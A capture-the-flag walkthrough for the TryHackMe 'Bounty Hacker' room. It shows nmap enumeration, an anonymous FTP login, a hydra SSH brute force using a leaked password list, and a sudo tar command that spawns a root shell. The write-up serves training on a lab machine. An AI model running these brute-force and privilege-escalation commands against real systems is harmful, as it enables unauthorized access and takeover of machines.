# Bounty Hacker 
 ~ https://tryhackme.com/room/cowboyhacker
* ### This is a direct walk-through to the flag. Hopping that you have given your best before referring to this write-up
* ### Assuming that your are using Attack-box or conntected to VPN. If not, do refer to [vpn_connection](https://github.com/shybu9/TRY-HACK-ME/tree/main/OPEN-VPN-CONNECTION "OPEN VPN CONNECTION")

<br>

![bonty intro](https://user-images.githubusercontent.com/112984045/200177378-c657e25e-8fa7-43fa-b5de-7c34aa08ee05.png)
 ~ the IP will be given once you join the room and Start Machine succefully after connecting to OPEN-VPN
 
 ## ENUMERATION :

 * For ENUMERATION we use nmap tool which come by default in kali linux.
 <br>command : 
 ```bash
 nmap -sVC -T4 -v <IP> 
 ```
 ![bonty nmap](https://user-images.githubusercontent.com/112984045/200179161-11ae6f38-9148-47f6-acbc-267679af2992.png)
  <br>~ we can add -v argument for more verbose output.
 
 * I usually perform one more scan by using my personal tool : [port-scanner](https://github.com/shy.bu9/portscanner)
 ![bonty portscanner](https://user-images.githubusercontent.com/112984045/200180020-c653c656-2254-4224-b674-866404b281eb.png)<br>
  ~ I prefer this tool because of its speed as you can see it just took 858 seconds for scanning 65535 ports.Even still some improvements to be done
 
 ### ANALYSING BOTH SCANS :
 * number of OPEN PORTS : 3
 * PORT NUMBERS : 21,22,80
 * OPERATING SYSTEM : Uinux, Linux
 * service running on PORT 21 : ftp
 * service running on PORT 22 : ssh
 * service running on PORT 80 : http
 
 ## FOOTHOLD
 
 * `the ftp port 21 has Anonymous FTP login allowed (FTP code 230)`
 ![bonty ftpmarked](https://user-images.githubusercontent.com/112984045/200180232-5e8d8e21-8bdc-4e18-b1c6-f7f3a30ce9ba.png)
 <br> ~ Therefore we can login to ftp without password by using USERNAME: Anonymous.
 
 
 ![bonty ftp login](https://user-images.githubusercontent.com/112984045/200180807-8c088b60-5245-4a8e-8fd2-5261e67f2263.png)
 <br> ~ After login have observed the files using the command:
 ```bash
 ls -la
 ```
 <br>
 
 * As we cannot read the files on shell, we will download those files to our local system using commands:
 ``` bash
 get locks.txt
 ```
 ```bash
 get task.txt
 ```
 <br>
 
 * Now we can read the content in the files using command:
 ``` bash
 cat locks.txt
 ```
 ![bonty locks](https://user-images.githubusercontent.com/112984045/200181166-706202a0-397a-4215-aaea-b415642294d5.png)
  <br> ~ This file looks like password list, This could be helpfull for any further bruteforce.
  <br>
  
  ``` bash
  cat tash.txt
  ```
  ![bonty task](https://user-images.githubusercontent.com/112984045/200181361-2a32ec55-cc5d-4cfc-9312-54712a80668b.png)
  <br> ~ There is a message which is written by 'lin'
  ![bonty 3](https://user-images.githubusercontent.com/112984045/200181716-bc85faea-1009-495f-a21d-7e7a36c1fdc9.png)
  <br>
  
  `* As we have login access to ftp port hence there is only port 22 which could be bruteforce using locks.txt i.e ssh`
   ![bonty 4](https://user-images.githubusercontent.com/112984045/200181900-16b07e3f-d763-443a-9a8b-b097ea46b0ed.png)
   <br>
   
   * We have username: 'lin' and password list: locks.txt. We can use hydra tool for bruteforcing ssh server.
   <br>command:
   ```bash
   hydra -l lin -P locks.txt ssh://<IP>
   ```
   ![bonty hydra](https://user-images.githubusercontent.com/112984045/200182851-8e096ab3-b256-47d3-aa9b-8825637ee755.png)
   <br> ~ Now we can login to ssh using these credentials.
   ![bonty 5](https://user-images.githubusercontent.com/112984045/200183044-0a8e07d5-d71c-4232-be91-ef66868be99c.png)

 
   
   <br>
   
   * After logging in to ssh we can look for file contents and read them using the same commands :
   ```bash 
   ls -la
   ```
   ```bash
   cat user.txt
   ```
   ![bonty 5](https://user-images.githubusercontent.com/112984045/200183130-ea0fc571-676e-47bc-9790-122cbc2be4fb.png)
<br>
   
   ## PRIVILEGE ESCALATION :
  * To check the root level access on command or authority to read, write, execute on files, we use command :
  ```bash
  sudo -l
  ```
  ![bonty sudo-l](https://user-images.githubusercontent.com/112984045/200184909-39ac8c6a-66dd-4ba5-8aa2-a82be628221b.png)
   <br> ~ we can observe that user lin can run the commad tar as sudo.
   
  <br>
  
  ` * We can look in [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) for a command to escalate.`
  ![bonty gtfbins tar](https://user-images.githubusercontent.com/112984045/200183946-d92a93da-2afa-4d22-9c5f-9a8259c89517.png)
<br>

* Finally we can run the command :
```bash
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
<br> ~ congo you are in.

* Now change directory to /root and read the flag using the commands :
```bash
cd /root
```
```bash
cat root.txt
```

`DO SUBMIT YOUR FLAG TO COMPLETE THE TASK`
   
### FOR ANY DOUBTS OR SUGGESTIONS DO WRITE TO shy.bu9@gmail.com
   
